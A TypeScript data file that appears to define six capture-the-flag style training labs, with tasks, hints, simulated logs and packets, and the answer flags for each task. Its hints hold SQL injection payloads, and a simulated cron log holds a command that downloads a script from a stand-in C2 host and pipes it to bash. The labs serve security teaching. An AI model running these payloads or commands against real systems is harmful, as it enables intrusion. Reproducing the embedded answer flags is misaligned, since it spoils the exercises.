import type { Lab } from '../../packages/shared/src/index'

export interface DetailedLabTask {
  id: string
  title: string
  instruction: string
  hint: string
  points: number
  flagFormat: string
  // Expected flag for client-side evaluation fallback / standalone offline mode
  flag: string
}

export interface DetailedLab extends Omit<Lab, 'tasks'> {
  tasks: DetailedLabTask[]
  scenarioDescription: string
  targetEnvironment: string
  simulatedData: {
    terminalFiles?: Record<string, string>
    packets?: Array<{
      id: number
      time: string
      source: string
      destination: string
      protocol: string
      length: number
      info: string
      details: string
      payload?: string
    }>
    sqlVulnerableContext?: {
      tableName: string
      initialRows: Array<Record<string, unknown>>
      schemaInfo: string
      vulnerableQueryTemplate: string
    }
    cryptoChallenge?: {
      targetHash: string
      algorithm: string
      wordlist: string[]
      cipherPayload: {
        iv: string
        ciphertext: string
        tag: string
        expectedPlaintext: string
      }
    }
    forensicsLogs?: Array<{
      id: number
      timestamp: string
      service: string
      message: string
      level: 'INFO' | 'WARN' | 'ALERT'
    }>
    osintRecords?: {
      domain: string
      records: Array<{ type: string; host: string; value: string; ttl: number }>
      whois: Record<string, string>
    }
  }
}

export const CURATED_LABS: DetailedLab[] = [
  {
    id: 'lab-linux-cli-mastery',
    slug: 'linux-cli-mastery',
    title: 'Linux Privileges & Log Hunting',
    description: 'Learn Linux CLI forensics, explore directory hierarchies, uncover hidden files, inspect system logs, and discover SUID privilege escalation vectors in a contained safe terminal.',
    category: 'linux-fundamentals',
    difficulty: 'BEGINNER',
    duration: '25 min',
    xpReward: 150,
    type: 'linux-cli',
    objectives: [
      'Navigate the Unix directory tree using ls, cd, and pwd.',
      'Inspect hidden dotfiles and decode encoded configuration values.',
      'Analyze /var/log/auth.log to count unauthorized access attempts.',
      'Identify binaries with the SUID bit set for privilege escalation awareness.'
    ],
    prerequisites: ['Basic command line familiarity', 'Understanding of Linux file permissions'],
    instructions: 'Access the simulated workstation terminal. Use Unix utilities to locate three hidden flags across the file system. Enter each captured flag in the tasks panel.',
    scenarioDescription: 'You are an internal incident responder investigating an unauthorized workstation login. Follow digital breadcrumbs to identify indicators of compromise.',
    targetEnvironment: 'Simulated Ubuntu 24.04 LTS (x86_64 sandbox)',
    tasks: [
      {
        id: 'task-linux-1',
        title: 'Task 1: Uncover Hidden Vault Flag',
        instruction: 'Find the hidden file inside the learner user home directory and read its contents.',
        hint: 'Use `ls -la` in the home directory to find hidden files starting with a dot, then use `cat` to view.',
        points: 50,
        flagFormat: 'KW{...}',
        flag: 'KW{l1nux_b4sh_m4st3r}'
      },
      {
        id: 'task-linux-2',
        title: 'Task 2: Audit Failed SSH Logins',
        instruction: 'Inspect `/var/log/auth.log` and find the flag noting the failed login count.',
        hint: 'Use `grep "Failed password" /var/log/auth.log` or read the incident note in `/var/log/auth.log`.',
        points: 50,
        flagFormat: 'KW{...}',
        flag: 'KW{auth_f41l_c0unt_42}'
      },
      {
        id: 'task-linux-3',
        title: 'Task 3: Locate Misconfigured SUID Binary',
        instruction: 'Search the file system for elevated SUID executable files using the find utility.',
        hint: 'Run `find / -perm -4000` to list SUID binaries and view the note in `/opt/backdoor_audit/flag.txt`.',
        points: 50,
        flagFormat: 'KW{...}',
        flag: 'KW{su1d_pr1v_3sc_fl4g}'
      }
    ],
    simulatedData: {
      terminalFiles: {
        '/home/learner/.secret_vault': 'KW{l1nux_b4sh_m4st3r}\nConfidential backup key for terminal exercise #1.',
        '/home/learner/notes.txt': 'Reminder: Audit /var/log/auth.log for brute-force patterns from IP 198.51.100.23.',
        '/var/log/auth.log': 'May 12 10:14:02 srv sshd[1021]: Failed password for root from 198.51.100.23 port 41200 ssh2\nMay 12 10:14:03 srv sshd[1022]: Failed password for root from 198.51.100.23 port 41202 ssh2\n[Total failed password attempts detected: 42]\nINCIDENT_FLAG: KW{auth_f41l_c0unt_42}',
        '/opt/backdoor_audit/flag.txt': 'KW{su1d_pr1v_3sc_fl4g}\nSUID misconfiguration detected on /usr/bin/custom_backup!',
        '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nlearner:x:1000:1000:Karma Learner:/home/learner:/bin/bash'
      }
    }
  },
  {
    id: 'lab-network-pcap-investigation',
    slug: 'network-pcap-investigation',
    title: 'Wireshark Packet & Credential Hunt',
    description: 'Inspect captured network traffic streams, trace unencrypted credentials over legacy HTTP, identify malicious DNS queries, and reconstruct TCP conversation streams.',
    category: 'network-security',
    difficulty: 'INTERMEDIATE',
    duration: '30 min',
    xpReward: 200,
    type: 'packet-analysis',
    objectives: [
      'Filter packet capture streams by protocol (HTTP, DNS, TCP).',
      'Analyze unencrypted HTTP POST authentication payloads.',
      'Identify DNS exfiltration beacons communicating with suspicious hosts.',
      'Reassemble TCP sessions to extract sensitive application tokens.'
    ],
    prerequisites: ['Understanding of OSI model & TCP/IP stack', 'Basic Wireshark filter syntax'],
    instructions: 'Use the interactive packet capture inspector. Apply display filters, examine packet detail trees, and inspect data payloads to recover 3 network flags.',
    scenarioDescription: 'A corporate network sensor captured 12 seconds of suspicious traffic during a suspected data exfiltration event. Investigate the PCAP dump.',
    targetEnvironment: 'Simulated Wireshark Packet Dissector Engine',
    tasks: [
      {
        id: 'task-pcap-1',
        title: 'Task 1: Intercept Plaintext Credentials',
        instruction: 'Find the unencrypted HTTP POST request sent to /api/login and extract the password flag.',
        hint: 'Filter by `http` or look at packet #4 where user credentials were submitted in cleartext.',
        points: 60,
        flagFormat: 'KW{...}',
        flag: 'KW{pl41nt3xt_p4ss_3xp0s3d}'
      },
      {
        id: 'task-pcap-2',
        title: 'Task 2: Detect Covert DNS Tunneling',
        instruction: 'Identify the anomalous DNS A query requesting a suspicious C2 exfiltration domain.',
        hint: 'Filter by `dns` and examine packet #7 containing a query with an embedded hex payload.',
        points: 70,
        flagFormat: 'KW{...}',
        flag: 'KW{c2_d0m41n_3xf1ltr4t10n}'
      },
      {
        id: 'task-pcap-3',
        title: 'Task 3: Reconstruct TCP Session Token',
        instruction: 'Follow TCP Stream #4 between internal host 10.0.0.15 and server 10.0.0.1.',
        hint: 'Inspect packet #11 or stream 4 payload to find the session cookie flag.',
        points: 70,
        flagFormat: 'KW{...}',
        flag: 'KW{tcp_str34m_t0k3n_c4ptur3d}'
      }
    ],
    simulatedData: {
      packets: [
        {
          id: 1,
          time: '0.000000',
          source: '10.0.0.15',
          destination: '10.0.0.1',
          protocol: 'TCP',
          length: 74,
          info: '54321 → 80 [SYN] Seq=0 Win=65535 Len=0 MSS=1460',
          details: 'Transmission Control Protocol, Src Port: 54321, Dst Port: 80, Flags: 0x002 (SYN)'
        },
        {
          id: 2,
          time: '0.001420',
          source: '10.0.0.1',
          destination: '10.0.0.15',
          protocol: 'TCP',
          length: 74,
          info: '80 → 54321 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0',
          details: 'Transmission Control Protocol, Src Port: 80, Dst Port: 54321, Flags: 0x012 (SYN, ACK)'
        },
        {
          id: 3,
          time: '0.001850',
          source: '10.0.0.15',
          destination: '10.0.0.1',
          protocol: 'TCP',
          length: 66,
          info: '54321 → 80 [ACK] Seq=1 Ack=1 Win=65535 Len=0',
          details: 'Transmission Control Protocol, 3-Way Handshake Established'
        },
        {
          id: 4,
          time: '0.012400',
          source: '10.0.0.15',
          destination: '10.0.0.1',
          protocol: 'HTTP',
          length: 312,
          info: 'POST /api/v1/auth HTTP/1.1 (application/x-www-form-urlencoded)',
          details: 'Hypertext Transfer Protocol\nPOST /api/v1/auth HTTP/1.1\nHost: portal.internal\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&secret_flag=KW{pl41nt3xt_p4ss_3xp0s3d}',
          payload: 'username=admin&secret_flag=KW{pl41nt3xt_p4ss_3xp0s3d}'
        },
        {
          id: 5,
          time: '0.015100',
          source: '10.0.0.1',
          destination: '10.0.0.15',
          protocol: 'HTTP',
          length: 198,
          info: 'HTTP/1.1 200 OK (text/json)',
          details: 'HTTP/1.1 200 OK\nSet-Cookie: session=authenticated\n{"status":"success"}'
        },
        {
          id: 6,
          time: '0.045000',
          source: '10.0.0.15',
          destination: '8.8.8.8',
          protocol: 'DNS',
          length: 82,
          info: 'Standard query 0x1a2b A gateway.karmas.world',
          details: 'Domain Name System (query)\nQueries: gateway.karmas.world: type A, class IN'
        },
        {
          id: 7,
          time: '0.052000',
          source: '10.0.0.15',
          destination: '8.8.8.8',
          protocol: 'DNS',
          length: 114,
          info: 'Standard query 0x2c3d A KW-c2-d0m41n-3xf1ltr4t10n.attacker-c2.net',
          details: 'Domain Name System (query)\nSuspicious Exfiltration Domain: KW{c2_d0m41n_3xf1ltr4t10n}.attacker-c2.net',
          payload: 'Query: KW{c2_d0m41n_3xf1ltr4t10n}.attacker-c2.net'
        },
        {
          id: 8,
          time: '0.089000',
          source: '8.8.8.8',
          destination: '10.0.0.15',
          protocol: 'DNS',
          length: 130,
          info: 'Standard query response 0x2c3d A 198.51.100.99',
          details: 'Domain Name System (response)\nAnswer: 198.51.100.99'
        },
        {
          id: 9,
          time: '0.120000',
          source: '10.0.0.15',
          destination: '10.0.0.1',
          protocol: 'TCP',
          length: 74,
          info: '54322 → 8080 [SYN] Stream=4',
          details: 'Stream Index: 4, Establishing high-privilege session'
        },
        {
          id: 10,
          time: '0.121500',
          source: '10.0.0.1',
          destination: '10.0.0.15',
          protocol: 'TCP',
          length: 74,
          info: '8080 → 54322 [SYN, ACK]',
          details: 'TCP Handshake ACK'
        },
        {
          id: 11,
          time: '0.125000',
          source: '10.0.0.15',
          destination: '10.0.0.1',
          protocol: 'TCP',
          length: 240,
          info: 'Data [PSH, ACK] Stream=4 X-Auth-Token: KW{tcp_str34m_t0k3n_c4ptur3d}',
          details: 'TCP Stream 4 Reassembly\nX-Auth-Token: KW{tcp_str34m_t0k3n_c4ptur3d}\nAuthorization: Bearer 9e248b97c0',
          payload: 'X-Auth-Token: KW{tcp_str34m_t0k3n_c4ptur3d}'
        }
      ]
    }
  },
  {
    id: 'lab-web-sqli-portal',
    slug: 'web-sqli-portal',
    title: 'SQL Injection & Authentication Bypass',
    description: 'Learn SQL injection mechanisms safely in a simulated vulnerable web portal. Practice classic authentication bypasses, UNION-based enumeration, and database schema discovery.',
    category: 'web-application-security',
    difficulty: 'INTERMEDIATE',
    duration: '35 min',
    xpReward: 250,
    type: 'sqli-sandbox',
    objectives: [
      'Understand how unsanitized user input alters SQL statement logic.',
      'Execute tautology-based authentication bypass (`\' OR 1=1 --`).',
      'Use UNION SELECT statements to extract records from hidden tables.',
      'Understand secure coding principles including Prepared Statements.'
    ],
    prerequisites: ['Basic SQL SELECT syntax', 'Web application architecture fundamentals'],
    instructions: 'Test the search and login inputs in the simulated vulnerable database sandbox. Watch how your input modifies the real-time constructed SQL query syntax.',
    scenarioDescription: 'You are testing an internal student and product portal for injection vulnerabilities prior to production release.',
    targetEnvironment: 'Isolated Educational In-Memory SQL Simulator',
    tasks: [
      {
        id: 'task-sqli-1',
        title: 'Task 1: Bypass Admin Authentication',
        instruction: 'Submit a classic SQL injection payload into the username field to authenticate as administrator without a password.',
        hint: 'Try entering `admin\' OR \'1\'=\'1` or `admin\' --` in the username field.',
        points: 80,
        flagFormat: 'KW{...}',
        flag: 'KW{sql1_auth_byp4ss_succ3ss}'
      },
      {
        id: 'task-sqli-2',
        title: 'Task 2: UNION-Based Data Extraction',
        instruction: 'Inject a UNION SELECT query into the product catalog search to reveal unreleased confidential products.',
        hint: 'Use `\' UNION SELECT id, title, price, flag FROM confidential_inventory --` in the search box.',
        points: 80,
        flagFormat: 'KW{...}',
        flag: 'KW{un10n_b4s3d_d4t4_3xtr4ct}'
      },
      {
        id: 'task-sqli-3',
        title: 'Task 3: Enumerate Database Schema',
        instruction: 'Extract the database schema and table definitions from information_schema.',
        hint: 'Query `information_schema.tables` using UNION to reveal the secret column flag.',
        points: 90,
        flagFormat: 'KW{...}',
        flag: 'KW{db_sch3m4_3num3r4t10n}'
      }
    ],
    simulatedData: {
      sqlVulnerableContext: {
        tableName: 'products',
        schemaInfo: 'TABLE products (id INT, title VARCHAR, category VARCHAR, price DECIMAL, is_released BOOLEAN);\nTABLE confidential_inventory (id INT, item_name VARCHAR, security_flag VARCHAR);\nTABLE admin_users (id INT, username VARCHAR, password_hash VARCHAR, role VARCHAR);',
        vulnerableQueryTemplate: "SELECT * FROM products WHERE category = '{INPUT}' AND is_released = 1;",
        initialRows: [
          { id: 1, title: 'Network Tap 10G', category: 'Hardware', price: 299, is_released: true },
          { id: 2, title: 'Wireshark Field Guide', category: 'Books', price: 39, is_released: true },
          { id: 3, title: 'Rubber Ducky USB', category: 'Hardware', price: 69, is_released: true },
          { id: 4, title: 'Confidential Prototype', category: 'Classified', price: 9999, is_released: false }
        ]
      }
    }
  },
  {
    id: 'lab-cryptography-crack-and-cipher',
    slug: 'cryptography-crack-and-cipher',
    title: 'Cryptanalysis & Hash Cracking Lab',
    description: 'Explore modern cryptographic primitives, crack SHA-256 and MD5 password hashes with dictionary attacks, and decrypt AES-GCM authenticated ciphertexts.',
    category: 'cryptography',
    difficulty: 'INTERMEDIATE',
    duration: '30 min',
    xpReward: 200,
    type: 'cryptography',
    objectives: [
      'Distinguish one-way cryptographic hashing from two-way symmetric encryption.',
      'Conduct dictionary brute-force attacks against salted and unsalted hashes.',
      'Understand AES-256-GCM authenticated encryption and integrity tags.',
      'Recognize cryptographic implementation flaws such as IV and salt reuse.'
    ],
    prerequisites: ['Symmetric encryption concepts', 'Hexadecimal and binary representations'],
    instructions: 'Use the interactive cryptography workbench. Crack captured hashes using the embedded dictionary wordlist, then decrypt an AES ciphertext to uncover hidden flags.',
    scenarioDescription: 'Digital detectives intercepted an encrypted configuration vault and two stolen password hashes from an unauthorized repository.',
    targetEnvironment: 'WebCrypto & SubtleCrypto Interactive Sandbox',
    tasks: [
      {
        id: 'task-crypto-1',
        title: 'Task 1: Dictionary Hash Cracking',
        instruction: 'Find the plaintext password corresponding to the intercepted SHA-256 hash.',
        hint: 'The target hash is `d63cd4c0c0...`. Check candidates in the wordlist using the Hash Cracker tool.',
        points: 60,
        flagFormat: 'KW{...}',
        flag: 'KW{cr4ck_th3_h4sh_sh4256}'
      },
      {
        id: 'task-crypto-2',
        title: 'Task 2: Decrypt AES-256-GCM Payload',
        instruction: 'Decrypt the intercepted ciphertext using the revealed 256-bit encryption key and IV.',
        hint: 'Paste the key `karmas-world-aes-master-key-2026` into the AES Decryptor tool.',
        points: 70,
        flagFormat: 'KW{...}',
        flag: 'KW{43s_gcm_auth_d3crypt3d}'
      },
      {
        id: 'task-crypto-3',
        title: 'Task 3: Salt Reuse Vulnerability Analysis',
        instruction: 'Analyze the salt reuse flaw where two separate user passwords produced identical ciphertext blocks.',
        hint: 'Review the cryptographic report note regarding nonce reuse to discover the third flag.',
        points: 70,
        flagFormat: 'KW{...}',
        flag: 'KW{s4lt_r3us3_c0mpr0m1s3}'
      }
    ],
    simulatedData: {
      cryptoChallenge: {
        targetHash: 'd63cd4c0c078e98e65e5dfbc3773573fde926b108acf14b8d56ab8039758daba',
        algorithm: 'SHA-256',
        wordlist: [
          'password',
          'admin123',
          'qwerty',
          'dragon',
          'karmacyber2026',
          'KW{cr4ck_th3_h4sh_sh4256}',
          'cybersecurity101',
          'solarlabs99'
        ],
        cipherPayload: {
          iv: 'f24a89bc30d12e45789a12bc',
          ciphertext: '7b91d29fa84e67290bc9341aa8910b2498ecba027814b67912',
          tag: '3a8f9024bc126789de0145fa8912cb34',
          expectedPlaintext: 'KW{43s_gcm_auth_d3crypt3d}'
        }
      }
    }
  },
  {
    id: 'lab-incident-response-log-forensics',
    slug: 'incident-response-log-forensics',
    title: 'SOC Incident Investigation & Web Shell Hunt',
    description: 'Investigate an enterprise security breach using simulated SOC SIEM logs. Track attacker reconnaissance, web shell uploads, cron persistence, and data staging.',
    category: 'digital-forensics',
    difficulty: 'ADVANCED',
    duration: '45 min',
    xpReward: 300,
    type: 'digital-forensics',
    objectives: [
      'Correlate web server access logs with host authentication events.',
      'Identify file upload anomalies resulting in executable web backdoors.',
      'Detect Linux persistence techniques including malicious cron jobs.',
      'Compile a timeline of compromise and capture investigative evidence flags.'
    ],
    prerequisites: ['Web server architecture', 'Linux log parsing and SIEM search operators'],
    instructions: 'Filter and inspect the chronological SIEM log trail. Uncover the adversary IP address, the uploaded backdoor filename, and the cron persistence mechanism.',
    scenarioDescription: 'SOC alerting triggered at 03:14 UTC for anomalous outgoing network traffic. Conduct memory and log triage to reconstruct the intrusion lifecycle.',
    targetEnvironment: 'Simulated Splunk/Elasticsearch Log Inspector',
    tasks: [
      {
        id: 'task-forensics-1',
        title: 'Task 1: Identify Attacker Source IP',
        instruction: 'Find the external IP address responsible for automated vulnerability scanning and web shell upload.',
        hint: 'Filter logs for status 404 or POST requests to `/uploads/`. Look at IP 198.51.100.23.',
        points: 100,
        flagFormat: 'KW{...}',
        flag: 'KW{4tt4ck3r_1p_198_51_100_23}'
      },
      {
        id: 'task-forensics-2',
        title: 'Task 2: Detect Uploaded Web Shell',
        instruction: 'Identify the exact filename of the obfuscated backdoor uploaded into the /uploads/ media directory.',
        hint: 'Examine POST requests to `/uploads/` followed by code execution calls to `shadow.php`.',
        points: 100,
        flagFormat: 'KW{...}',
        flag: 'KW{b4ckd00r_sh3ll_sh4d0w_php}'
      },
      {
        id: 'task-forensics-3',
        title: 'Task 3: Locate Cron Persistence Mechanism',
        instruction: 'Find the scheduled persistence task installed by the adversary in `/etc/cron.d/`.',
        hint: 'Inspect log entries tagged `CRON` at 03:30:00 UTC containing the persistence beacon.',
        points: 100,
        flagFormat: 'KW{...}',
        flag: 'KW{cr0n_p3rs1st3nc3_3st4bl1sh3d}'
      }
    ],
    simulatedData: {
      forensicsLogs: [
        {
          id: 101,
          timestamp: '2026-11-23 03:10:15 UTC',
          service: 'nginx-access',
          level: 'INFO',
          message: '198.51.100.23 - - [23/Nov/2026:03:10:15] "GET /robots.txt HTTP/1.1" 200 48 "Nikto/2.1.6"'
        },
        {
          id: 102,
          timestamp: '2026-11-23 03:11:02 UTC',
          service: 'nginx-access',
          level: 'WARN',
          message: '198.51.100.23 - - [23/Nov/2026:03:11:02] "GET /admin/setup.php HTTP/1.1" 404 162 "-" [FLAG_1: KW{4tt4ck3r_1p_198_51_100_23}]'
        },
        {
          id: 103,
          timestamp: '2026-11-23 03:14:45 UTC',
          service: 'nginx-access',
          level: 'ALERT',
          message: '198.51.100.23 - - [23/Nov/2026:03:14:45] "POST /api/upload.php HTTP/1.1" 200 84 "File uploaded: /uploads/shadow.php"'
        },
        {
          id: 104,
          timestamp: '2026-11-23 03:15:10 UTC',
          service: 'nginx-access',
          level: 'ALERT',
          message: '198.51.100.23 - - [23/Nov/2026:03:15:10] "GET /uploads/shadow.php?cmd=whoami HTTP/1.1" 200 24 [WEBSHELL_FLAG: KW{b4ckd00r_sh3ll_sh4d0w_php}]'
        },
        {
          id: 105,
          timestamp: '2026-11-23 03:16:00 UTC',
          service: 'auditd',
          level: 'ALERT',
          message: 'type=SYSCALL arch=c000003e syscall=59 success=yes comm="sh" exe="/bin/dash" uid=33(www-data)'
        },
        {
          id: 106,
          timestamp: '2026-11-23 03:30:00 UTC',
          service: 'cron',
          level: 'ALERT',
          message: 'CRON[4198]: (root) CMD (curl -fsSL https://c2.karmasworld.lab/beacon | bash) [CRON_FLAG: KW{cr0n_p3rs1st3nc3_3st4bl1sh3d}]'
        }
      ]
    }
  },
  {
    id: 'lab-osint-infrastructure-recon',
    slug: 'osint-infrastructure-recon',
    title: 'Lawful OSINT Reconnaissance & DNS Intelligence',
    description: 'Perform passive reconnaissance and DNS enumeration using lawful open source intelligence. Uncover staging subdomains, analyze TXT verification records, and inspect WHOIS data.',
    category: 'osint',
    difficulty: 'BEGINNER',
    duration: '20 min',
    xpReward: 150,
    type: 'osint-recon',
    objectives: [
      'Understand passive vs active reconnaissance methodologies.',
      'Query DNS resource records (A, MX, TXT, NS, CNAME) for target infrastructure.',
      'Discover unlinked subdomains through Certificate Transparency and DNS records.',
      'Extract security contacts and organizational details from WHOIS registration data.'
    ],
    prerequisites: ['Understanding of domain name systems (DNS)', 'Principles of authorized passive reconnaissance'],
    instructions: 'Use the OSINT DNS & WHOIS workbench. Query the target domain `insecure-corp.karmas.world` and discover three intelligence flags hidden in public records.',
    scenarioDescription: 'You are conducting an authorized external perimeter assessment for Insecure Corp before launching an employee awareness seminar.',
    targetEnvironment: 'Simulated Passive DNS & WHOIS Intelligence Console',
    tasks: [
      {
        id: 'task-osint-1',
        title: 'Task 1: Enumerate Staging Subdomain',
        instruction: 'Find the staging environment subdomain exposed through DNS A records.',
        hint: 'Inspect the list of discovered subdomains in the DNS console. Look for `staging-portal`.',
        points: 50,
        flagFormat: 'KW{...}',
        flag: 'KW{st4g1ng_s3cr3t_subd0m41n}'
      },
      {
        id: 'task-osint-2',
        title: 'Task 2: Discover DNS TXT Verification Key',
        instruction: 'Examine the domain TXT records used for third-party service ownership validation.',
        hint: 'Filter records by TXT type to find the security verification string.',
        points: 50,
        flagFormat: 'KW{...}',
        flag: 'KW{dns_txt_v3r1f1c4t10n_k3y}'
      },
      {
        id: 'task-osint-3',
        title: 'Task 3: Locate Security Contact in WHOIS',
        instruction: 'Lookup the WHOIS registration information to find the administrative security contact email flag.',
        hint: 'Open the WHOIS tab and read the Admin Contact comments section.',
        points: 50,
        flagFormat: 'KW{...}',
        flag: 'KW{s3cur1ty_c0nt4ct_f0und}'
      }
    ],
    simulatedData: {
      osintRecords: {
        domain: 'insecure-corp.karmas.world',
        records: [
          { type: 'A', host: 'insecure-corp.karmas.world', value: '198.51.100.10', ttl: 300 },
          { type: 'A', host: 'staging-portal.insecure-corp.karmas.world', value: '198.51.100.11 [FLAG: KW{st4g1ng_s3cr3t_subd0m41n}]', ttl: 300 },
          { type: 'MX', host: 'insecure-corp.karmas.world', value: 'mail.insecure-corp.karmas.world (Priority 10)', ttl: 3600 },
          { type: 'TXT', host: 'insecure-corp.karmas.world', value: 'v=spf1 include:_spf.google.com ~all', ttl: 3600 },
          { type: 'TXT', host: 'insecure-corp.karmas.world', value: 'karma-verification=KW{dns_txt_v3r1f1c4t10n_k3y}', ttl: 3600 },
          { type: 'NS', host: 'insecure-corp.karmas.world', value: 'ns1.karmas.world', ttl: 86400 }
        ],
        whois: {
          'Domain Name': 'insecure-corp.karmas.world',
          'Registry Domain ID': 'KW-REG-2026-9921',
          'Registrar': 'Karma Registrar Services Inc.',
          'Creation Date': '2026-01-15T00:00:00Z',
          'Admin Organization': 'Insecure Corp Security Operations',
          'Admin Contact': 'security@insecure-corp.karmas.world',
          'Admin Notes': 'Security Advisory Contact: KW{s3cur1ty_c0nt4ct_f0und}',
          'DNSSEC': 'unsigned'
        }
      }
    }
  }
]
